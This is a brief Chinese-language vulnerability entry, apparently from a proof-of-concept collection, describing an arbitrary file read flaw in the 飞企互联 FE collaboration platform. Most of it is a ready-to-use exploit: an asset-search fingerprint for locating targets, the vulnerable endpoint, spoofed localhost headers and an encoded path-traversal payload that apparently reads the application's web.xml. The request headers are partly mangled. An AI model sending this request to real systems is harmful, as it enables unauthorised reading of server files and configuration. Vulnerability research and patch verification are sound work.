# 飞企互联FE业务协作平台attachment存在任意文件读取漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /servlet/webchat/attachment/1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```
Gecko/20100101 Firefox/109.0
Content-Length: 164
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
mailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALg
AuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUAL
gB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs
```

**其他**
- 飞企互联 FE 业务协作平台attachment存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台